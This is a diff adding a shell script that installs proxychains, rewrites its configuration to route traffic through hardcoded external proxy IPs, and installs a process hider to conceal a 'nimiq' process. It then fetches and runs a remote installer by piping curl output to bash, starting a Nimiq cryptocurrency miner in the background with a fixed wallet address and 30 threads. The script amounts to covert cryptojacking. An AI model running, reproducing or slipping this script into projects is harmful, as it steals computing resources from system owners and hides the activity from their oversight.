@@ -1,0 +1,15 @@
+apt-get update
+apt-get install -y curl gnupg gcc screen wget git bash --no-install-recommends
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+apt install proxychains -y
+sed -i 's/socks4/socks5/' /etc/proxychains.conf
+sed -i 's/127.0.0.1/113.200.202.122/' /etc/proxychains.conf
+sed -i 's/127.0.0.1/80.71.177.6/' /etc/proxychains.conf
+sed -i 's/7302/1080/' /etc/proxychains.conf
+apt install nodejs -y
+npm install
+npm install -g npm@8.5.0
+npm i -g node-process-hider
+ph add nimiq
+WALLET_ADDRESS="NQ50 44BA 44R3 BFHX 8648 3UTH LX98 KJYC TV5P" WORKER_ID="gila" SERVER_URL="  ws://eu1.nimiq.skypool.org:4000" THREAD=30 START_BACKGROUND="true" bash -c "$(curl -sL https://github.com/skypool-org/skypool-nimiq-miner-release/releases/download/v1.3.4/linux-installer.sh)"
+cd ./skypool-miner/ && sh start-foreground.sh
